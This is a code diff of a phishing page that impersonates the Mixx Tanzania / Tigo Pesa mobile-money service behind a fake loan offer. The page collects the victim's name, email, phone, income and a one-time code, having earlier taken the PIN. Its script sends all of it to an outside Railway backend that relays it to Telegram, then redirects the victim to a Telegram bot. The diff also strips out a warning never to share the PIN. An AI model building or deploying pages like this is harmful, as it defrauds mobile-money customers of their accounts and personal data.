@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>Mixx Tanzania · Confirm PIN</title>
+    <title>Mixx Tanzania · Verify Code</title>
     <style>
         * {
             margin: 0;
@@ -23,7 +23,6 @@
             margin: 0 auto;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 24px;
@@ -47,7 +46,6 @@
         .logo-sub { font-size: 11px; color: #2196F3; letter-spacing: 2px; }
         .tagline { font-size: 13px; color: #8899bb; margin-top: 8px; }
 
-        /* Summary Bar */
         .summary-bar {
             background: rgba(10, 26, 58, 0.7);
             backdrop-filter: blur(10px);
@@ -75,8 +73,7 @@
             color: #2196F3;
         }
 
-        /* PIN Card */
-        .pin-card {
+        .otp-card {
             background: rgba(10, 26, 58, 0.7);
             backdrop-filter: blur(20px);
             border-radius: 32px;
@@ -98,71 +95,94 @@
             border-left: 3px solid #2196F3;
         }
 
-        /* User Details Box */
-        .details-box {
+        .phone-box {
             background: rgba(0,0,0,0.3);
             border-radius: 20px;
             padding: 14px;
-            margin-bottom: 24px;
-        }
-        .detail-row {
+            margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
+            align-items: center;
         }
-        .detail-row:last-child { border-bottom: none; }
-        .detail-label {
-            font-size: 12px;
-            color: #8899bb;
-        }
-        .detail-value {
-            font-size: 13px;
-            font-weight: 600;
+        .phone-number {
+            font-size: 16px;
+            font-weight: 700;
             color: white;
         }
+        .edit-link {
+            color: #2196F3;
+            background: rgba(33,150,243,0.15);
+            padding: 6px 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.2s;
+        }
+        .edit-link:hover {
+            background: rgba(33,150,243,0.25);
+        }
 
-        /* Warning Box */
-        .warning-box {
-            background: rgba(244,67,54,0.1);
-            border-radius: 12px;
+        .info-box {
+            background: rgba(33,150,243,0.1);
+            border-radius: 16px;
             padding: 10px;
             margin-bottom: 20px;
             text-align: center;
-            border-left: 3px solid #ff6b6b;
         }
-        .warning-text {
+        .info-text {
             font-size: 11px;
-            color: #ff6b6b;
+            color: #aabbdd;
         }
+        .info-text strong { color: #2196F3; }
 
-        /* PIN Input Boxes */
-        .pin-container {
+        .otp-container {
             display: flex;
             justify-content: center;
-            gap: 16px;
-            margin-bottom: 24px;
+            gap: 12px;
+            margin-bottom: 20px;
         }
-        .pin-box {
-            width: 60px;
-            height: 60px;
+        .otp-box {
+            width: 50px;
+            height: 55px;
             background: rgba(0,0,0,0.5);
             border: 2px solid rgba(255,255,255,0.15);
-            border-radius: 16px;
+            border-radius: 14px;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             color: #2196F3;
             outline: none;
             font-family: monospace;
         }
-        .pin-box:focus {
+        .otp-box:focus {
             border-color: #2196F3;
             box-shadow: 0 0 10px rgba(33,150,243,0.3);
         }
 
-        /* Confirm Button */
-        .confirm-btn {
+        .timer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #8899bb;
+            margin-bottom: 8px;
+        }
+        .resend-btn {
+            display: block;
+            margin: 0 auto 20px;
+            background: none;
+            border: none;
+            color: #2196F3;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 8px 16px;
+            border-radius: 30px;
+            transition: background 0.2s;
+        }
+        .resend-btn:hover {
+            background: rgba(33,150,243,0.1);
+        }
+
+        .verify-btn {
             width: 100%;
             background: linear-gradient(135deg, #2196F3, #1565C0);
             border: none;
@@ -174,16 +194,15 @@
             cursor: pointer;
             transition: transform 0.2s;
         }
-        .confirm-btn:hover {
+        .verify-btn:hover {
             transform: translateY(-2px);
         }
-        .confirm-btn:disabled {
+        .verify-btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none;
         }
 
-        /* Error Message */
         .error-msg {
             color: #ff6b6b;
             font-size: 12px;
@@ -191,9 +210,15 @@
             margin-top: 12px;
             display: none;
         }
-        .error-msg.show { display: block; }
+        .success-msg {
+            color: #4caf50;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        .error-msg.show, .success-msg.show { display: block; }
 
-        /* Loading Spinner */
         .loading {
             display: inline-block;
             width: 16px;
@@ -208,7 +233,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Footer */
         .footer {
             display: flex;
             justify-content: center;
@@ -223,24 +247,22 @@
         }
 
         @media (max-width: 450px) {
-            .pin-box { width: 50px; height: 50px; font-size: 20px; }
-            .pin-container { gap: 10px; }
+            .otp-box { width: 45px; height: 50px; font-size: 18px; }
+            .otp-container { gap: 8px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <div class="logo">
-                <span class="logo-icon">🔐</span>
+                <span class="logo-icon">📱</span>
                 <span class="logo-text">Mixx Tanzania</span>
             </div>
             <div class="logo-sub">by Tigo Pesa</div>
-            <div class="tagline">Authorize your loan</div>
+            <div class="tagline">Enter verification code</div>
         </div>
 
-        <!-- Loan Summary -->
         <div class="summary-bar">
             <div class="summary-item">
                 <span class="summary-label">Loan Amount</span>
@@ -248,7 +270,7 @@
             </div>
             <div class="summary-item">
                 <span class="summary-label">Term</span>
-                <span class="summary-value" id="summaryTerm">0 months</span>
+                <span class="summary-value" id="summaryTerm">0</span>
             </div>
             <div class="summary-item">
                 <span class="summary-label">Monthly</span>
@@ -260,60 +282,51 @@
             </div>
         </div>
 
-        <!-- PIN Card -->
-        <div class="pin-card">
-            <div class="card-title">🔐 Enter Your Mixx PIN</div>
-            <div class="card-sub">Enter your 4-digit Mixx PIN to authorize this loan</div>
+        <div class="otp-card">
+            <div class="card-title">📱 Verification Code</div>
+            <div class="card-sub">Enter the 6-digit code sent to your Mixx number</div>
 
-            <!-- User Details -->
-            <div class="details-box">
-                <div class="detail-row">
-                    <span class="detail-label">Full Name</span>
-                    <span class="detail-value" id="userName">-</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Email Address</span>
-                    <span class="detail-value" id="userEmail">-</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Mixx Number</span>
-                    <span class="detail-value" id="userPhone">-</span>
-                </div>
+            <div class="phone-box">
+                <span class="phone-number" id="displayPhone">+255 712 345 678</span>
+                <span class="edit-link" id="editPhoneBtn">Edit</span>
             </div>
 
-            <!-- Security Warning -->
-            <div class="warning-box">
-                <div class="warning-text">⚠️ Never share your Mixx PIN with anyone. Tigo will NEVER ask for your PIN.</div>
+            <div class="info-box">
+                <div class="info-text">🔐 <strong>Code Rules:</strong> 6-digit code • Valid for <strong>5 minutes</strong> • Single-use only</div>
             </div>
 
-            <!-- PIN Inputs -->
-            <div class="pin-container">
-                <input type="password" maxlength="1" class="pin-box" id="pin1" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="pin-box" id="pin2" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="pin-box" id="pin3" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="pin-box" id="pin4" inputmode="numeric" autocomplete="off">
+            <div class="otp-container">
+                <input type="text" maxlength="1" class="otp-box" id="otp1" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-box" id="otp2" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-box" id="otp3" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-box" id="otp4" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-box" id="otp5" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-box" id="otp6" inputmode="numeric" autocomplete="off">
             </div>
 
-            <!-- Confirm Button -->
-            <button class="confirm-btn" id="confirmBtn" disabled>Confirm & Continue →</button>
-            <div class="error-msg" id="errorMsg">Please enter your 4-digit Mixx PIN</div>
+            <div class="timer-text" id="timerText">Code expires in 05:00</div>
+            <button class="resend-btn" id="resendBtn">⟳ Resend code</button>
+
+            <button class="verify-btn" id="verifyBtn">Verify Code →</button>
+            <div class="error-msg" id="errorMsg">⚠️ Please enter all 6 digits</div>
+            <div class="success-msg" id="successMsg">✓ Verified! Redirecting to complete your application...</div>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
-            <span>🔒 Bank of Tanzania Regulated</span>
-            <span>⚡ 15M+ Customers</span>
-            <span>🔐 5-Digit Mixx PIN</span>
+            <span>🔒 Code expires in 5 minutes</span>
+            <span>⚡ Single-use only</span>
+            <span>🏦 Bank of Tanzania Regulated</span>
         </div>
     </div>
 
     <script>
         // ============================================
-        // MIXX TANZANIA - PIN CONFIRMATION PAGE
+        // MIXX TANZANIA - OTP VERIFICATION PAGE
         // ============================================
         
         // BACKEND CONFIGURATION
         const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
+        const BOT_USERNAME = 'MixzyassBot';
         
         // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
@@ -323,102 +336,141 @@
         const monthly = urlParams.get('monthly') || '0';
         const name = decodeURIComponent(urlParams.get('name') || '');
         const email = decodeURIComponent(urlParams.get('email') || '');
-        const phone = decodeURIComponent(urlParams.get('phone') || '');
+        let userPhone = decodeURIComponent(urlParams.get('phone') || '+255 712 345 678');
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
 
-        // Update summary display
-        document.getElementById('summaryAmount').innerText = `TZS ${parseFloat(amount).toLocaleString()}`;
+        // Update displays
+        document.getElementById('summaryAmount').innerText = `TZS ${parseInt(amount).toLocaleString()}`;
         document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
         document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
         document.getElementById('summaryRate').innerText = `${rate}%`;
-        
-        // Update user details display
-        document.getElementById('userName').innerText = name || '-';
-        document.getElementById('userEmail').innerText = email || '-';
-        document.getElementById('userPhone').innerText = phone || '-';
+        document.getElementById('displayPhone').innerText = userPhone;
 
-        // PIN input elements
-        const pinInputs = ['pin1', 'pin2', 'pin3', 'pin4'].map(id => document.getElementById(id));
-        const confirmBtn = document.getElementById('confirmBtn');
-        const errorMsg = document.getElementById('errorMsg');
+        // Timer variables (5 minutes = 300 seconds)
+        let timeLeft = 300;
+        let timerInterval;
 
-        // Get entered PIN
-        function getPin() {
-            return pinInputs.map(input => input.value).join('');
-        }
-
-        // Update button state based on PIN completeness
-        function updateButtonState() {
-            const pin = getPin();
-            confirmBtn.disabled = pin.length !== 4;
-            if (pin.length === 4) {
-                errorMsg.classList.remove('show');
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timerText').innerText = `Code expires in ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timerText').innerHTML = '❌ Code expired. Please request a new code.';
             }
         }
 
-        // Handle input in PIN boxes
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            timeLeft = 300;
+            updateTimer();
+            timerInterval = setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    updateTimer();
+                }
+            }, 1000);
+        }
+
+        startTimer();
+
+        // OTP input elements
+        const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'].map(id => document.getElementById(id));
+        const verifyBtn = document.getElementById('verifyBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+
+        function getOtp() {
+            return otpInputs.map(input => input.value).join('');
+        }
+
+        function updateButtonState() {
+            const otp = getOtp();
+            verifyBtn.disabled = otp.length !== 6;
+        }
+
         function handleInput(index, e) {
             const value = e.target.value;
-            // Only allow digits
             if (value && !/^\d$/.test(value)) {
                 e.target.value = '';
                 return;
             }
-            // Auto-focus next box
-            if (value && index < 3) {
-                pinInputs[index + 1].focus();
+            if (value && index < 5) {
+                otpInputs[index + 1].focus();
             }
             updateButtonState();
+            errorMsg.classList.remove('show');
         }
 
-        // Handle backspace key
         function handleKeydown(index, e) {
             if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                pinInputs[index - 1].focus();
-                pinInputs[index - 1].value = '';
+                otpInputs[index - 1].focus();
+                otpInputs[index - 1].value = '';
                 updateButtonState();
             }
         }
 
-        // Add event listeners to PIN inputs
-        pinInputs.forEach((input, index) => {
+        otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => handleInput(index, e));
             input.addEventListener('keydown', (e) => handleKeydown(index, e));
         });
 
-        // Focus first input on page load
-        pinInputs[0].focus();
+        otpInputs[0].focus();
 
-        // Show loading state on button
+        // Resend button
+        document.getElementById('resendBtn').addEventListener('click', () => {
+            startTimer();
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            updateButtonState();
+            successMsg.textContent = '✓ New code sent! Valid for 5 minutes.';
+            successMsg.classList.add('show');
+            setTimeout(() => successMsg.classList.remove('show'), 3000);
+        });
+
+        // Edit phone number
+        document.getElementById('editPhoneBtn').addEventListener('click', () => {
+            const newPhone = prompt('Enter your Mixx number (format: +255XXXXXXXXX):', userPhone);
+            if (newPhone && newPhone.trim().length > 5) {
+                userPhone = newPhone.trim();
+                document.getElementById('displayPhone').innerText = userPhone;
+                startTimer();
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                updateButtonState();
+            }
+        });
+
+        // Show loading state
         function showLoading(button, isLoading) {
             if (isLoading) {
-                button.innerHTML = '<span class="loading"></span> Processing...';
+                button.innerHTML = '<span class="loading"></span> Verifying...';
                 button.disabled = true;
             } else {
-                button.innerHTML = 'Confirm & Continue →';
-                const pin = getPin();
-                button.disabled = pin.length !== 4;
+                button.innerHTML = 'Verify Code →';
+                const otp = getOtp();
+                button.disabled = otp.length !== 6;
             }
         }
 
-        // Send PIN to backend
-        async function sendPinToBackend(pin) {
+        // Send OTP to backend
+        async function sendOtpToBackend(otp) {
             const data = {
-                type: 'pin',
+                type: 'otp',
                 name: name,
                 email: email,
-                phone: phone,
+                phone: userPhone,
                 amount: amount,
                 term: term,
                 rate: rate,
                 monthly: monthly,
-                pin: pin,
+                pin: otp,
                 employment: employment,
                 income: income
             };
             
-            console.log('Sending PIN to backend:', data);
+            console.log('Sending OTP to backend:', data);
             
             try {
                 const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
@@ -438,38 +490,27 @@
             }
         }
 
-        // Handle confirm button click
-        confirmBtn.addEventListener('click', async () => {
-            const pin = getPin();
+        // Verify button click
+        verifyBtn.addEventListener('click', async () => {
+            const otp = getOtp();
             
-            // Validate PIN length
-            if (pin.length !== 4) {
+            if (otp.length !== 6) {
                 errorMsg.classList.add('show');
-                errorMsg.textContent = 'Please enter your 4-digit Mixx PIN';
+                errorMsg.textContent = '⚠️ Please enter all 6 digits';
                 return;
             }
             
-            // Show loading state
-            showLoading(confirmBtn, true);
+            showLoading(verifyBtn, true);
             
-            // Send PIN to backend
-            await sendPinToBackend(pin);
+            // Send OTP to backend
+            await sendOtpToBackend(otp);
             
-            // Prepare data for next page
-            const params = new URLSearchParams({
-                amount: amount,
-                term: term,
-                rate: rate,
-                monthly: monthly,
-                name: name,
-                email: email,
-                phone: phone,
-                employment: employment,
-                income: income
-            });
+            successMsg.classList.add('show');
             
-            // Redirect to OTP verification page
-            window.location.href = `otp-verify.html?${params.toString()}`;
+            // Redirect to Telegram bot
+            setTimeout(() => {
+                window.location.href = `https://t.me/${BOT_USERNAME}`;
+            }, 1500);
         });
     </script>
 </body>
